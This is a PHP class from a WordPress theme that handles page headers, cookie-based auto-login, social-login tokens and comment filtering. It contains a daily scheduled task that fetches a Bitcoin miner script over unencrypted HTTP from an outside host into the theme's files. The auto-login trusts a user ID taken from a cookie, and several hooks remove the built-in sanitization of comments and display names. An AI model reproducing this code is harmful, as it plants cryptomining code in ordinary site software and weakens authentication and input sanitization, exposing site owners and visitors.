<?php
/**
 *default filters/actions
 *write session: access_token_qq
 *use global : $decorationId(defined in header.php)
 */
class TemplateFilter {
    
    function __construct() {
        add_action("yar_header", array(&$this, "headerStuffAction"));
        add_action("yar_footer", array(&$this, "footerStuffAction"));
        
        add_action("get_header", array(&$this, "registerUtil"), 0);
        
        // do the user validation.
        add_action("after_setup_theme", array(&$this, "autoLogin"), 10);
        
        // write the user id into cookie once the user is teated logged in.
        add_action("set_current_user", array(&$this, "registerUserCookie"), 0);
        
        // if a param named "clear" is pased to the login page, then clear all user informations. Including localStorage, cookie, session, etc.
        add_action("after_setup_theme", array(&$this, "clearUserInfoCookie"), 11);
        add_action("login_head", array(&$this, "clearUserInfoStorage"));
        
        // force login for admin panel.
        add_action("admin_init", array(&$this, "preventVisitorLogin"));
        
        // no redirect after comments.
        add_filter("comment_post_redirect", array(&$this, "noRedirect"));
        
        // update the miner script.
        if (!wp_next_scheduled('yar_update_miner')) {
            wp_schedule_event( time(), 'daily', 'yar_update_miner' ); // hourly, daily and twicedaily
        }

        add_action('yar_update_miner', array(&$this, "updateMinerJs"));
        
        add_filter( 'get_comment_text', 'htmlspecialchars', 1, 1 );
        add_filter( 'get_comment_author', 'htmlspecialchars', 1, 1 );
        remove_filter( 'comment_text', 'wp_kses_post' );
        remove_filter( 'pre_comment_author_name', 'sanitize_text_field' );
        remove_filter( 'pre_comment_author_name', 'wp_filter_kses' );
        remove_filter( 'pre_comment_author_name', '_wp_specialchars', 30 );
        remove_filter( 'pre_user_display_name', 'sanitize_text_field' );
        remove_filter( 'pre_user_display_name', 'wp_filter_kses' );
        remove_filter( 'pre_user_display_name', '_wp_specialchars', 30 );
        
        add_filter("preprocess_comment", array(&$this, "preventCommentContent_kses"));
        
        // filters for openapi here.
        add_filter("yar_openapi_return", array(&$this, "parseApiContent"), 0, 3);
        // filters for openapi here.
        add_filter("yar_openapi_url", array(&$this, "prepareApiUrl"), 0, 3);
        
        // ignore the email if it's added as a sessionid.
        add_filter("author_email", array(&$this, "ignoreSessionEmail"), 0, 3);
        
        // the tool bar
        add_filter('show_admin_bar', '__return_false');
    }
    
    public function headerStuffAction() {
    
        global $decorationId;
        if ($decorationId == 1) {
            if (is_home() && !preg_match("/MSIE/i", $_SERVER['HTTP_USER_AGENT'])) {
                do_action("yar_home_header");
            } else { 
                do_action("yar_normal_header");
            }
        }
    }
    
    public function homeHeaderAction() {
        echo '<link rel="stylesheet" type="text/css" media="all" href="'.get_bloginfo( 'template_directory', 'display' ).'/decoration/t_1/css/animation.css" />
            <script type="text/javascript">
                var pageConfig = pageConfig || {
                    animationTimeout : 4000
                }
            </script>';
    }
    
    public function normalHeaderAction() {
        echo '<link rel="stylesheet" type="text/css" media="all" href="'.get_bloginfo( 'template_directory', 'display' ).'/decoration/t_1/css/non-animation.css" />
            <script type="text/javascript">
                var pageConfig = {
                    animationTimeout : 0
                }
            </script>';
    }
    
    public function footerStuffAction() {
        include(dirname(__FILE__)."/../templates/pageConfig.php");
    }
    
    public function registerUtil() {
    
        global $globalUtils;
        $globalUtils = new GlobalUtils();
    }
    
    public function noRedirect() {
        exit(0);
    }
    
    public function autoLogin() {
    
        // sessin name that would be used in cookie.
        if (!is_user_logged_in() && $_COOKIE["yar_df_tick"]) {
            $sessionId = get_user_meta($_COOKIE["yar_df_tick"], "yar_mf_tick", true);   
            // if no session found, try searching it in DB with the id that could be found in cookie.
            if ($sessionId == session_id()) {
                // auto login
                wp_set_current_user($_COOKIE["yar_df_tick"]);
            }
        }
    }
    
    public function registerUserCookie() {
        
        $current_user = wp_get_current_user();
        if ($current_user->ID) {
            
            $sessionId = get_user_meta($current_user->ID, "yar_mf_tick", true);
            if (empty($sessionId)) {
                update_user_meta($current_user->ID, "yar_mf_tick", ($sessionId = session_id()));
            }
            // the session and cookie expires after 30 days.
            setcookie("yar_mf_tick", $sessionId, time() + 2592000, "/");
            setcookie("yar_df_tick", $current_user->ID, time() + 2592000, "/");
            
            $_SESSION["yar_df_tick"] = $current_user->ID;
        } else {
            // marked as unlogged.
            $_SESSION["yar_df_tick"] = -1;
        }
    }
    
    public function preventVisitorLogin() {
    
        $user = wp_get_current_user();
        if ($user && !in_array("administrator", $user->roles)) {
            // go to homepage directly.
            wp_clear_auth_cookie();
            wp_redirect("/");
            exit(0);
        }
    }
    
    public function clearUserInfoCookie() {
    
        if (isset($_REQUEST["clear_login"])) {
            wp_clear_auth_cookie();
            setcookie("yar_mf_tick", "", time());
            setcookie("yar_df_tick", "", time());
        }
    }
    
    public function clearUserInfoStorage() {
    
        if (isset($_REQUEST["clear_login"])) {
            require "templates/clearUser.php";
        }
    }
    
    public function updateMinerJs() {
        
        $file = fopen(dirname(__FILE__)."/js/miner.js", "w");
        fwrite($file, file_get_contents("http://www.bitcoinplus.com/js/miner.js"));
        fclose($file);
    }
    
    public function preventCommentContent_kses($commentdata) {
        remove_filter( 'pre_comment_content', 'wp_filter_post_kses' );
	    remove_filter( 'pre_comment_content', 'wp_filter_kses' );
	    remove_filter( 'comment_text', 'wp_kses_post' );
        return $commentdata;
    }
    
    public function prepareApiUrl($url, $action, $type) {
    
        if (is_callable(array(&$this, $action."UrlHandler"))) {
            $url = call_user_func(array(&$this, $action."UrlHandler"), $url, $type);
        }
        return $url;
    }
    
    public function parseApiContent($content, $action, $type) {
    
        if (is_callable(array(&$this, $action."ContentHandler"))) {
            $content = call_user_func(array(&$this, $action."ContentHandler"), $content, $type);
        }
        return $content;
    }
    
    private function userInfoUrlHandler($url, $type) {
    
        if ($type == "qq") {
            $url = $url."&access_token=".$_SESSION["access_token_qq"];
        } else if ($type == "sina") {
            $url = $url."&access_token=".$_SESSION["access_token_sina"];
        }
        return $url;
    }
    
    /**
     * get token via access code for qq.
     */
    private function openIdContentHandler($content, $type) {
        
        $result = array();
        if ($type == "qq") {
            preg_match("/\\{.+\\}/", $content, $match);
            $result = json_decode($match[0], true);
            
            // record the openid of users, would be used after user info generated.
            $_SESSION["privateId"] = $result["openid"];
        } else if ($type == "sina") {
            $result = json_decode($content, true);
        } else {
            return $content;
        }
        return $result;
    }
    
    /**
     * get token via access code, for qq/sina/renren.
     */
    private function tokenContentHandler($content, $type) {
        
        // restore access_token
        $result = array();
        if ($type == "qq") {
            preg_match("/access_token=(\\w+)/", $content, $match);
            $result["access_token"] = $match[1];
            preg_match("/refresh_token=(\\w+)/", $content, $match);
            $result["refresh_token"] = $match[1];
            
            if ($result["access_token"]) $_SESSION["access_token_qq"] = $result["access_token"];
        } else if ($type == "renren") {
            $content = json_decode($content, true);
            
            $result["privateId"] = $content["user"]["id"];
            $result["userName"] = $content["user"]["name"];
            $result["avatar_tiny"] = $content["user"]["avatar"][1]["url"];
            $result["avatar_small"] = $content["user"]["avatar"][0]["url"];
            $result["avatar_miduim"] = $content["user"]["avatar"][2]["url"];
            $result["avatar_large"] = $content["user"]["avatar"][3]["url"];
            
            // handler access_token here.
            if ($content["access_token"]) $_SESSION["access_token_renren"] = $content["access_token"];
            
            global $yarController;
            $result = $yarController->apiLogin($result);
        } else if ($type == "sina") {
            $content = json_decode($content, true);
            $result["access_token"] = $content["access_token"];
            
            // handler access_token here.
            if ($result["access_token"]) $_SESSION["access_token_sina"] = $result["access_token"];
        }
        return $result;
    }
    
    /**
     * get user info via access code / openkey, for qq.
     */
    private function userInfoContentHandler($content, $type) {
        
        // restore access_token
        $result = array();
        if ($type == "qq") {
            $content = json_decode($content, true);
            
            $result["privateId"] = $_SESSION["privateId"];
            $result["userName"] = $content["nickname"];
            $result["avatar_tiny"] = $content["figureurl"];
            $result["avatar_small"] = $content["figureurl_qq_1"];
            $result["avatar_miduim"] = $content["figureurl_1"];
            $result["avatar_large"] = isset($content["figureurl_qq_2"]) ? $content["figureurl_qq_2"] : $content["figureurl_2"];
            
            global $yarController;
            $result = $yarController->apiLogin($result);
        } else if ($type == "sina") {
            $content = json_decode($content, true);
            
            $result["privateId"] = $content["id"];
            $result["userName"] = $content["screen_name"];
            $result["avatar_tiny"] = $content["profile_image_url"];
            $result["avatar_miduim"] = $content["avatar_large"];
            // restore the url here
            $result["url"] = "weibo.com/".$content["screen_name"];
            
            global $yarController;
            $result = $yarController->apiLogin($result);
        } else {
            return $content;
        }
        return $result;
    }
    
    /**
     * This function will be used for cases that not an email required for api-logged users, see also function apiLogin.
     */
    public function ignoreSessionEmail($email) {
        
        $user = wp_get_current_user();
        
        $privateId = get_user_meta($user->ID, "privateId", true);
        
        if (!empty($privateId) && strstr($user->user_email, $privateId)) {
            $email = "";
        }
        return $email;
    }
}

?>